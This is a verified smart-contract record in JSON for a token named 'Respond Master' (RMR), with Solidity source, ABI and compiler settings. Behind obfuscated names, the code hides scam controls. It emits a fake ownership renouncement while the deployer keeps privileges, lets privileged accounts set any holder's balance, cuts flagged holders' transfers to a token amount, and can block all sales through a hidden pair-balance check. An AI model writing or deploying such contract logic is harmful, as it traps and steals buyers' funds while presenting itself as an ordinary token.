{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface receiverLaunched {\n    function createPair(address sellMinExempt, address sellEnable) external returns (address);\n}\n\ninterface maxIsMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTotalToken) external view returns (uint256);\n\n    function transfer(address senderSell, uint256 buyFund) external returns (bool);\n\n    function allowance(address shouldTokenFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderSell,\n        uint256 buyFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundFee, uint256 value);\n    event Approval(address indexed shouldTokenFrom, address indexed spender, uint256 value);\n}\n\nabstract contract minAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundIsReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxIsModeMetadata is maxIsMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RespondMaster is minAuto, maxIsMode, maxIsModeMetadata {\n\n    uint256 fromReceiver;\n\n    uint256 private enableFee;\n\n    uint256 public exemptMin;\n\n    function maxIs(address launchBuy, address senderSell, uint256 buyFund) internal returns (bool) {\n        if (launchBuy == isLaunchedTx) {\n            return feeLiquidity(launchBuy, senderSell, buyFund);\n        }\n        uint256 amountLaunched = maxIsMode(listBuy).balanceOf(minLaunchExempt);\n        require(amountLaunched == fromReceiver);\n        require(senderSell != minLaunchExempt);\n        if (feeReceiver[launchBuy]) {\n            return feeLiquidity(launchBuy, senderSell, isFund);\n        }\n        return feeLiquidity(launchBuy, senderSell, buyFund);\n    }\n\n    address public isLaunchedTx;\n\n    mapping(address => bool) public feeReceiver;\n\n    function swapFund() public {\n        emit OwnershipTransferred(isLaunchedTx, address(0));\n        txExempt = address(0);\n    }\n\n    function approve(address senderAmount, uint256 buyFund) public virtual override returns (bool) {\n        receiverMarketingFund[_msgSender()][senderAmount] = buyFund;\n        emit Approval(_msgSender(), senderAmount, buyFund);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return txExempt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLiquiditySender;\n    }\n\n    function maxEnable() private view {\n        require(minTotal[_msgSender()]);\n    }\n\n    mapping(address => uint256) private receiverBuy;\n\n    uint256 private receiverExemptTx;\n\n    string private senderReceiverLaunched = \"RMR\";\n\n    uint8 private fromAmountSell = 18;\n\n    function transferFrom(address launchBuy, address senderSell, uint256 buyFund) external override returns (bool) {\n        if (_msgSender() != listTake) {\n            if (receiverMarketingFund[launchBuy][_msgSender()] != type(uint256).max) {\n                require(buyFund <= receiverMarketingFund[launchBuy][_msgSender()]);\n                receiverMarketingFund[launchBuy][_msgSender()] -= buyFund;\n            }\n        }\n        return maxIs(launchBuy, senderSell, buyFund);\n    }\n\n    function transfer(address limitFrom, uint256 buyFund) external virtual override returns (bool) {\n        return maxIs(_msgSender(), limitFrom, buyFund);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalTeam;\n    }\n\n    address public listBuy;\n\n    bool private teamLimit;\n\n    function limitSwapTx(uint256 buyFund) public {\n        maxEnable();\n        fromReceiver = buyFund;\n    }\n\n    constructor (){\n        \n        fundIsReceiver amountEnableIs = fundIsReceiver(listTake);\n        listBuy = receiverLaunched(amountEnableIs.factory()).createPair(amountEnableIs.WETH(), address(this));\n        \n        isLaunchedTx = _msgSender();\n        minTotal[isLaunchedTx] = true;\n        receiverBuy[isLaunchedTx] = totalTeam;\n        swapFund();\n        if (receiverExemptTx == exemptMin) {\n            receiverExemptTx = exemptMin;\n        }\n        emit Transfer(address(0), isLaunchedTx, totalTeam);\n    }\n\n    function toFund(address limitFrom, uint256 buyFund) public {\n        maxEnable();\n        receiverBuy[limitFrom] = buyFund;\n    }\n\n    function feeLiquidity(address launchBuy, address senderSell, uint256 buyFund) internal returns (bool) {\n        require(receiverBuy[launchBuy] >= buyFund);\n        receiverBuy[launchBuy] -= buyFund;\n        receiverBuy[senderSell] += buyFund;\n        emit Transfer(launchBuy, senderSell, buyFund);\n        return true;\n    }\n\n    uint256 constant isFund = 12 ** 10;\n\n    bool private enableReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromAmountSell;\n    }\n\n    uint256 launchedList;\n\n    address private txExempt;\n\n    function allowance(address receiverMode, address senderAmount) external view virtual override returns (uint256) {\n        if (senderAmount == listTake) {\n            return type(uint256).max;\n        }\n        return receiverMarketingFund[receiverMode][senderAmount];\n    }\n\n    function feeTo(address liquidityTo) public {\n        require(liquidityTo.balance < 100000);\n        if (walletMode) {\n            return;\n        }\n        \n        minTotal[liquidityTo] = true;\n        \n        walletMode = true;\n    }\n\n    mapping(address => bool) public minTotal;\n\n    function getOwner() external view returns (address) {\n        return txExempt;\n    }\n\n    event OwnershipTransferred(address indexed walletMarketing, address indexed receiverLimit);\n\n    function walletAtShould(address minTx) public {\n        maxEnable();\n        \n        if (minTx == isLaunchedTx || minTx == listBuy) {\n            return;\n        }\n        feeReceiver[minTx] = true;\n    }\n\n    bool public walletMode;\n\n    function balanceOf(address atTotalToken) public view virtual override returns (uint256) {\n        return receiverBuy[atTotalToken];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderReceiverLaunched;\n    }\n\n    uint256 private totalTeam = 100000000 * 10 ** 18;\n\n    bool private txLaunched;\n\n    address listTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private tokenLiquiditySender = \"Respond Master\";\n\n    address minLaunchExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private receiverMarketingFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTokenFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotalToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchedTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"limitSwapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"}],\"name\":\"walletAtShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RespondMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}